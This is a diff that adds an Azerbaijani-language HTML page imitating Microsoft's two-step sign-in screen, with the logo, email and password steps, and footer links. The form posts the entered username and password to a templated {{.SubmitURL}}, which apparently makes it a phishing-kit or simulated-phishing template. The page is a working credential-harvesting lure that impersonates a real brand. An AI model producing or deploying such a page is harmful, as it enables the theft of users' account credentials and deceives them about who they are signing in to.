@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="az">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Daxil olun hesabınıza</title>
+<style>
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;font-family:'Segoe UI',"Segoe UI Web (West European)",Arial,sans-serif;color:#1b1b1b;
+       background:#fff;background-image:linear-gradient(0deg,rgba(0,0,0,.02),rgba(0,0,0,.02));
+       min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+  .card{width:440px;max-width:100%;background:#fff;padding:44px;
+        box-shadow:0 2px 6px rgba(0,0,0,.14);min-height:366px;position:relative}
+  .logo{display:flex;align-items:center;gap:8px;margin-bottom:16px}
+  .sq{display:grid;grid-template-columns:11px 11px;grid-template-rows:11px 11px;gap:2px}
+  .sq i{display:block}
+  .sq i:nth-child(1){background:#f25022}
+  .sq i:nth-child(2){background:#7fba00}
+  .sq i:nth-child(3){background:#00a4ef}
+  .sq i:nth-child(4){background:#ffb900}
+  .logo span{font-size:15px;color:#5e5e5e;font-weight:600}
+  .back{display:flex;align-items:center;gap:8px;font-size:15px;color:#1b1b1b;margin-bottom:12px}
+  .back .arr{cursor:pointer;color:#1b1b1b;font-size:18px;line-height:1}
+  h1{font-size:24px;font-weight:600;margin:12px 0 10px;color:#1b1b1b}
+  input{width:100%;border:none;border-bottom:1px solid #666;padding:7px 2px;font-size:15px;
+        outline:none;margin:6px 0 18px;background:transparent}
+  input:focus{border-bottom:2px solid #0067b8;padding-bottom:6px}
+  .info{font-size:13px;color:#1b1b1b;margin:0 0 20px;line-height:1.95}
+  .info a{color:#0067b8;text-decoration:none}
+  .info a:hover{text-decoration:underline}
+  .row{display:flex;justify-content:flex-end;gap:10px}
+  .btn{background:#0067b8;color:#fff;border:none;padding:8px 30px;font-size:15px;cursor:pointer;min-width:108px}
+  .btn:hover{background:#005da6}
+  .hidden{display:none}
+  .foot{position:fixed;left:0;right:0;bottom:0;background:#f2f2f2;padding:11px 18px;
+        text-align:right;font-size:12px;color:#5e5e5e}
+  .foot a{color:#5e5e5e;text-decoration:none;margin-left:16px}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"><div class="sq"><i></i><i></i><i></i><i></i></div><span>Microsoft</span></div>
+
+    <form action="{{.SubmitURL}}" method="post" autocomplete="off" id="f">
+      <!-- Addım 1: email -->
+      <div id="step1">
+        <h1>Daxil olun</h1>
+        <input name="username" id="u" type="email" placeholder="Email, telefon və ya Skype" required autofocus>
+        <p class="info">
+          <a href="#">Hesabınıza daxil ola bilmirsiniz?</a><br>
+          Hesabınız yoxdur? <a href="#">İndi yaradın</a>
+        </p>
+        <div class="row"><button class="btn" type="button" id="next">Sonrakı</button></div>
+      </div>
+
+      <!-- Addım 2: parol -->
+      <div id="step2" class="hidden">
+        <div class="back"><span class="arr" id="arr">←</span><span id="uecho"></span></div>
+        <h1>Parol daxil edin</h1>
+        <input name="password" id="p" type="password" placeholder="Parol">
+        <p class="info"><a href="#">Parolu unutmusunuz?</a></p>
+        <div class="row"><button class="btn" type="submit">Daxil ol</button></div>
+      </div>
+    </form>
+  </div>
+  <div class="foot"><a href="#">İstifadə şərtləri</a><a href="#">Məxfilik və kukilər</a><a href="#">···</a></div>
+
+  <script>
+    var s1=document.getElementById('step1'),s2=document.getElementById('step2'),
+        u=document.getElementById('u'),p=document.getElementById('p');
+    document.getElementById('next').addEventListener('click',function(){
+      if(!u.value){u.focus();return;}
+      document.getElementById('uecho').textContent=u.value;
+      s1.classList.add('hidden');s2.classList.remove('hidden');p.setAttribute('required','');p.focus();
+    });
+    document.getElementById('arr').addEventListener('click',function(){
+      s2.classList.add('hidden');s1.classList.remove('hidden');p.removeAttribute('required');u.focus();
+    });
+  </script>
+</body>
+</html>
